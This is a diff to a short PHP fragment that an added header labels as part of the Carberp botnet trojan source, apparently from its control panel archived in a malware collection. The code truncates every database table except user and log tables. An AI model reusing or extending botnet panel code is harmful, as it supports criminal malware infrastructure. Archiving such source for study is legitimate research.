@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $db_stats = $mysqli->query("SHOW TABLE STATUS WHERE (Name != 'bf_users') AND (Name NOT LIKE 'bf_logs%')", null, null, false);
@@ -17,7 +28,8 @@ unset($db_dels);
 unset($db_del);
 
 $db_clear = '';
-foreach($db_stats as $value){	$mysqli->query('TRUNCATE TABLE `' . $value->Name . '`;');
+foreach($db_stats as $value){
+	$mysqli->query('TRUNCATE TABLE `' . $value->Name . '`;');
 	$db_clear .= '`' . $value->Name . '`,';
 }
 $db_clear = rtrim($db_clear, ',');
